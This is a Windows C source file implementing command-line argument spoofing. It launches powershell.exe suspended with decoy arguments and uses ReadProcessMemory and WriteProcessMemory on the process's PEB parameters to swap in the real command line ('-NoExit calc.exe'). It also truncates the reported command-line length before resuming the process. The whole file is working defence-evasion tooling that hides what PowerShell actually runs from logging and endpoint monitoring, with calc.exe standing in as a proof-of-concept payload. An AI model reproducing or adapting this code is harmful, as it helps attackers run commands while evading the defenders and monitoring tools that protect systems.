#include "NATIVE_Functions.h"

// disable error 4996 (caused by sprint)
#pragma warning (disable:4996)


/*
	sizeof(STARTUP_ARGUMENRS) > sizeof(REAL_EXECUTED_ARGUMENTS)
*/
wchar_t STARTUP_ARGUMENRS[] = L"powershell.exe HELLO WORLD";
wchar_t REAL_EXECUTED_ARGUMENTS[] = L"powershell.exe -NoExit calc.exe";


BOOL ReadFromTargetProcess(IN HANDLE hProcess, IN PVOID pAddress, OUT PVOID* ppReadBuffer, IN DWORD dwBufferSize) {
	SIZE_T sNmbrOfBytesRead = NULL;
	*ppReadBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwBufferSize);
	if (!ReadProcessMemory(hProcess, pAddress, *ppReadBuffer, dwBufferSize, &sNmbrOfBytesRead) || sNmbrOfBytesRead != dwBufferSize) {
		printf("ReadProcessMemory has failed with error : %d\n", GetLastError());
		printf("Bytes Read : %d of %d\n", sNmbrOfBytesRead, dwBufferSize);
		return FALSE;
	}
	return TRUE;
}

BOOL WriteFromTargetProcess(IN HANDLE hProcess, IN PVOID pAddress, IN PVOID pBuffer, IN DWORD dwBufferSize) {

	SIZE_T sNmbrOfBytesWritten = NULL;

	if (!WriteProcessMemory(hProcess, pAddress, pBuffer, dwBufferSize, &sNmbrOfBytesWritten) || sNmbrOfBytesWritten != dwBufferSize) {

		printf("Write Process memory has failed with ERROR : %d\n", GetLastError());
		printf("Bytes written of %d : %d \n", sNmbrOfBytesWritten, dwBufferSize);
		return FALSE;
	}

	return TRUE;
}



BOOL CreateArgSpooferProcess(IN LPWSTR szStartupArg, IN LPWSTR szRealArg, OUT DWORD* dwProcessId, OUT HANDLE* hProcess, OUT HANDLE* hThread) {

	NTSTATUS STATUS = NULL;
	WCHAR szProcess[MAX_PATH];
	WCHAR lpPath[MAX_PATH * 2];
	STARTUPINFOW Si = { 0 };
	PROCESS_INFORMATION Pi = { 0 };
	CHAR WnDr[MAX_PATH];
	PROCESS_BASIC_INFORMATION PBI = { 0 };
	LPCSTR lpProcessName = "powershell.exe";
	ULONG uReturn = NULL;
	PPEB pPeb = NULL;

	PRTL_USER_PROCESS_PARAMETERS  pParms = NULL;


	RtlSecureZeroMemory(&Si, sizeof(STARTUPINFOW));
	RtlSecureZeroMemory(&Si, sizeof(PROCESS_INFORMATION));

	Si.cb = sizeof(STARTUPINFOW);

	fnNtQueryInformationProcess pNtQueryInformationProcess = (fnNtQueryInformationProcess)GetProcAddress(GetModuleHandleW(L"NTDLL"), "NtQueryInformationProcess");

	if (pNtQueryInformationProcess == NULL) {
		return FALSE;
	}

	if (!GetEnvironmentVariableA("WINDIR", WnDr, MAX_PATH)) {
		printf("[!] GetEnvironmentVariableA Failed With Error : %d \n", GetLastError());
		return FALSE;
	}
	swprintf_s(lpPath, MAX_PATH * 2, L"%s\\System32\\%s", WnDr, lpProcessName);



	lstrcpyW(szProcess, szStartupArg);
	if (!CreateProcessW(NULL, szStartupArg, NULL, NULL, FALSE, CREATE_SUSPENDED | CREATE_NO_WINDOW, NULL, L"C:\\Windows\\System32\\", &Si, &Pi)) {

		printf("\t[!] CreateProcessW Failed with Error : %d \n", GetLastError());
		return FALSE;
	}

	if ((STATUS = pNtQueryInformationProcess(Pi.hProcess, ProcessBasicInformation, &PBI, sizeof(PROCESS_BASIC_INFORMATION), &uReturn)) != 0) {
		printf("\t[!] NtQueryInformationProcess Failed With Error : 0x % 0.8X \n", STATUS);
		return FALSE;
	}

	PVOID pPebBuffer = NULL;


	if (!ReadFromTargetProcess(Pi.hProcess, PBI.PebBaseAddress, &pPebBuffer, sizeof(PEB))) {

	}

	pPeb = (PPEB)pPebBuffer;

	if (!pPeb) {
		printf("\t[!] Failed to retrieve valid PEB pointer.\n");
		return FALSE;
	}

	PVOID pParmsBuffer = NULL;

	if (!ReadFromTargetProcess(Pi.hProcess, pPeb->ProcessParameters, &pParmsBuffer, sizeof(RTL_USER_PROCESS_PARAMETERS) + 0xFF)) {

		printf("\t[!] Failed To Read Target's Process ProcessParameters \n");
		return FALSE;
	}

	pParms = (PRTL_USER_PROCESS_PARAMETERS)pParmsBuffer;

	if (!pParms) {
		printf("\t[!] Failed to retrieve valid PEB pointer.\n");
		return FALSE;
	}
	//Writing real args to the target process

	if (!WriteFromTargetProcess(Pi.hProcess, (PVOID)pParms->CommandLine.Buffer, (PVOID)szRealArg, (DWORD)(lstrlenW(szRealArg) * sizeof(WCHAR) + 1))) {

		printf("\t[!] Failed To Write The Real Parameters\n");
		return FALSE;
	}

	DWORD dwNewLen = sizeof(L"powershe");

	if (!WriteFromTargetProcess(Pi.hProcess, ((PBYTE)pPeb->ProcessParameters + offsetof(RTL_USER_PROCESS_PARAMETERS, CommandLine.Length)), (PVOID)&dwNewLen, sizeof(DWORD))) {
		return FALSE;
	}

	HeapFree(GetProcessHeap(), NULL, pPeb);
	HeapFree(GetProcessHeap(), NULL, pParms);

	//Resume the suspended thread
	ResumeThread(Pi.hThread);

	*dwProcessId = Pi.dwProcessId;
	*hProcess = Pi.hProcess;
	*hThread = Pi.hThread;



	if (*dwProcessId != NULL && *hProcess != NULL && *hThread != NULL)
		return TRUE;
	return FALSE;

}



int main() {

	HANDLE		hProcess = NULL,
		hThread = NULL;

	DWORD		dwProcessId = NULL;



	wprintf(L"[i] Target Process  Will Be Created With %s \n", STARTUP_ARGUMENRS);
	wprintf(L"[i] The Actual Arguments %s \n", REAL_EXECUTED_ARGUMENTS);


	if (!CreateArgSpooferProcess(STARTUP_ARGUMENRS, REAL_EXECUTED_ARGUMENTS, &dwProcessId, &hProcess, &hThread)) {
		return -1;
	}




	printf("\n[#] Press <Enter> To Quit ... ");
	getchar();
	CloseHandle(hProcess);
	CloseHandle(hThread);

	return 0;
}